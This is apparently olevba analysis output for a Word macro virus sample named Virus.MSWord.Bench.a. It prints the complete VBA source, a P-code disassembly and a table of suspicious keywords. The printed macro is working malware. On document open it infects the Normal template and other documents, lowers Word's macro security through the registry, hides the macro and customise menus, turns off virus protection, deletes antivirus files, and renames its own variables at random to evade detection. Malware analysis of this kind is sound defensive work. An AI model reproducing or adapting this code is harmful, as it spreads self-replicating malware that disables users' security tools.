olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Bench.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Bench.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
SetAttr "c:\program files\microsoft office\templates\normal.dot", vbNormal
If Month(Now) = Minute(Now) Then
Randomize: For x = 1 To 10: ActiveDocument.Shapes.AddShape(msoShapeCircles, Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select: Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255)): Selection.ShapeRange.Fill.Visible = msoTrue: Selection.ShapeRange.Fill.Solid: Next x
End If
If Day(Now) = Minute(Now) Then
    With Assistant.NewBalloon
        .Icon = msoIconAlert
        .Heading = "[B]MV.a"
        .Text = "Hello! I'm your new Office Assistant... I got tired of waiting so I figured to say hello!" & vbCr & vbCr & "Click on me if you need any help!"
        .Animation = msoAnimationGreeting
        .Show
    End With
End If
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines: ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Application.Version = 9# Then ' two lines below from W2000M/PSD - I'll give VicodinES the credit for this!
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    CommandBars("Macro").Controls("Security...").Enabled = False
End If
If Application.Version = 8# Then
    CommandBars("tools").Controls("Macro").Visible = False: CommandBars("tools").Controls("Customize...").Enabled = False: CommandBars("view").Controls("Toolbars").Enabled = False: CommandBars("view").Controls("Status Bar").Enabled = False
    Options.ConfirmConversions = False: Options.SaveNormalPrompt = False: Options.VirusProtection = False: Application.EnableCancelKey = wdCancelDisabled
End If
If nt = 0 And ad = 0 Then GoTo darn:
If nt = 0 Then NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoClose" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, ad))
If ad = 0 Then ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoOpen" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, nt))
' *** Remove remarks below if you want to kill the AV proggies ***
Kill "c:\program files\norton antivirus\Virscan2.dat"
Kill "c:\vdoc\*.*"
Kill "c:\f-prot\*.*"
' Kill "C:\program files\antiviral toolkit pro\AVP.key"
' ActiveDocument.Save
darn:
If nt <> 0 And ad = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub ' [B]MV.a Class Infection - [My first Virus! I just edited it a bit to be compatible with W2000 and W97]
Private Sub INITALIZE_VAMP()
On Error Resume Next
Randomize
Dim r1(1 To 8) As String ' Update the array for however many variable you add - so if you have r1(20) then this line should read r1(1 to 20)
r1(1) = "VARIABLE3": r1(2) = "VARIABLE4": r1(3) = "VARIABLE5": r1(4) = "VARIABLE6": r1(5) = "VAMP": r1(6) = "INITALIZE": r1(7) = "VARIABLE2": r1(8) = "VARIABLE1"
r1(9) = "ad": r1(10) = "nt"
For x = 1 To 8 ' Change this number up to how ever many variable you add - so if you have r1(20) then this line should read x = 1 to 20
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 900) & Int(Rnd * 900)
Call VAMP(a1, r1(x))
Next x
End Sub
Private Sub VAMP(VARIABLE1, VARIABLE2 As String)  'VAMP v1.0 -=[Thanks Vic!]=-
On Error Resume Next
Dim VARIABLE3 As Long: Dim VARIABLE4 As Long: Dim VARIABLE5 As Long: Dim VARIABLE6 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
VARIABLE3 = 1: VARIABLE4 = 1: VARIABLE5 = .CountOfLines: VARIABLE6 = Len(.Lines(.CountOfLines, 1))
Do While .Find(VARIABLE2, VARIABLE3, VARIABLE4, VARIABLE5, VARIABLE6, True)
s1 = .Lines(VARIABLE3, 1)
s1 = Left(s1, VARIABLE4 - 1) & VARIABLE1 & Mid(s1, VARIABLE6)
.replaceline VARIABLE3, s1
VARIABLE3 = VARIABLE5 + 1: VARIABLE4 = 1
VARIABLE5 = .CountOfLines
VARIABLE6 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Sub






-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Bench.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7281 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitStr 0x0036 "c:\program files\microsoft office\templates\normal.dot"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #3:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #4:
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	Ld msoShapeCircles 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' 	BoS 0x0000 
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' 	BoS 0x0000 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #5:
' 	EndIfBlock 
' Line #6:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #7:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #8:
' 	Ld msoIconAlert 
' 	MemStWith Icon 
' Line #9:
' 	LitStr 0x0007 "[B]MV.a"
' 	MemStWith Heading 
' Line #10:
' 	LitStr 0x0059 "Hello! I'm your new Office Assistant... I got tired of waiting so I figured to say hello!"
' 	Ld vbCr 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0021 "Click on me if you need any help!"
' 	Concat 
' 	MemStWith Then 
' Line #11:
' 	Ld msoAnimationGreeting 
' 	MemStWith Animation 
' Line #12:
' 	ArgsMemCallWith Show 0x0000 
' Line #13:
' 	EndWith 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St nt 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ad 
' Line #16:
' 	Ld Application 
' 	MemLd Version 
' 	LitR8 0x0000 0x0000 0x0000 0x4022 
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0021 0x004B " two lines below from W2000M/PSD - I'll give VicodinES the credit for this!"
' Line #17:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #18:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	Ld Application 
' 	MemLd Version 
' 	LitR8 0x0000 0x0000 0x0000 0x4020 
' 	Eq 
' 	IfBlock 
' Line #21:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "view"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	LitStr 0x000A "Status Bar"
' 	LitStr 0x0004 "view"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #22:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo darn 
' 	BoS 0x0000 
' 	EndIf 
' Line #25:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000D "Sub AutoClose"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld ad 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #26:
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "Sub AutoOpen"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld nt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #27:
' 	QuoteRem 0x0000 0x0041 " *** Remove remarks below if you want to kill the AV proggies ***"
' Line #28:
' 	LitStr 0x002E "c:\program files\norton antivirus\Virscan2.dat"
' 	ArgsCall Kill 0x0001 
' Line #29:
' 	LitStr 0x000B "c:\vdoc\*.*"
' 	ArgsCall Kill 0x0001 
' Line #30:
' 	LitStr 0x000D "c:\f-prot\*.*"
' 	ArgsCall Kill 0x0001 
' Line #31:
' 	QuoteRem 0x0000 0x0036 " Kill "C:\program files\antiviral toolkit pro\AVP.key""
' Line #32:
' 	QuoteRem 0x0000 0x0014 " ActiveDocument.Save"
' Line #33:
' 	Label darn 
' Line #34:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #35:
' 	EndSub 
' 	QuoteRem 0x0008 0x0067 " [B]MV.a Class Infection - [My first Virus! I just edited it a bit to be compatible with W2000 and W97]"
' Line #36:
' 	FuncDefn (Private Sub INITALIZE_VAMP())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall Read 0x0000 
' Line #39:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	VarDefn r1 (As String)
' 	QuoteRem 0x0019 0x0072 " Update the array for however many variable you add - so if you have r1(20) then this line should read r1(1 to 20)"
' Line #40:
' 	LitStr 0x0009 "VARIABLE3"
' 	LitDI2 0x0001 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0009 "VARIABLE4"
' 	LitDI2 0x0002 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0009 "VARIABLE5"
' 	LitDI2 0x0003 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0009 "VARIABLE6"
' 	LitDI2 0x0004 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "VAMP"
' 	LitDI2 0x0005 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0009 "INITALIZE"
' 	LitDI2 0x0006 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0009 "VARIABLE2"
' 	LitDI2 0x0007 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0009 "VARIABLE1"
' 	LitDI2 0x0008 
' 	ArgsSt r1 0x0001 
' Line #41:
' 	LitStr 0x0002 "ad"
' 	LitDI2 0x0009 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0002 "nt"
' 	LitDI2 0x000A 
' 	ArgsSt r1 0x0001 
' Line #42:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	For 
' 	QuoteRem 0x000F 0x0077 " Change this number up to how ever many variable you add - so if you have r1(20) then this line should read x = 1 to 20"
' Line #43:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0384 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0384 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St a1 
' Line #44:
' 	Ld a1 
' 	Ld x 
' 	ArgsLd r1 0x0001 
' 	ArgsCall (Call) VAMP 0x0002 
' Line #45:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' 	EndSub 
' Line #47:
' 	FuncDefn (Private Sub VAMP(VARIABLE1, VARIABLE2 As String))
' 	QuoteRem 0x0032 0x001B "VAMP v1.0 -=[Thanks Vic!]=-"
' Line #48:
' 	OnError (Resume Next) 
' Line #49:
' 	Dim 
' 	VarDefn VARIABLE3 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn VARIABLE4 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn VARIABLE5 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn VARIABLE6 (As Long)
' Line #50:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #51:
' 	LitDI2 0x0001 
' 	St VARIABLE3 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St VARIABLE4 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	St VARIABLE5 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St VARIABLE6 
' Line #52:
' 	Ld VARIABLE2 
' 	Ld VARIABLE3 
' 	Ld VARIABLE4 
' 	Ld VARIABLE5 
' 	Ld VARIABLE6 
' 	LitVarSpecial (True)
' 	ArgsMemLdWith Find 0x0006 
' 	DoWhile 
' Line #53:
' 	Ld VARIABLE3 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St s1 
' Line #54:
' 	Ld s1 
' 	Ld VARIABLE4 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld VARIABLE1 
' 	Concat 
' 	Ld s1 
' 	Ld VARIABLE6 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St s1 
' Line #55:
' 	Ld VARIABLE3 
' 	Ld s1 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #56:
' 	Ld VARIABLE5 
' 	LitDI2 0x0001 
' 	Add 
' 	St VARIABLE3 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St VARIABLE4 
' Line #57:
' 	MemLdWith CountOfLines 
' 	St VARIABLE5 
' Line #58:
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St VARIABLE6 
' Line #59:
' 	Loop 
' Line #60:
' 	EndWith 
' Line #61:
' 	EndSub 
' Line #62:
' Line #63:
' Line #64:
' Line #65:
' Line #66:
' Line #67:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

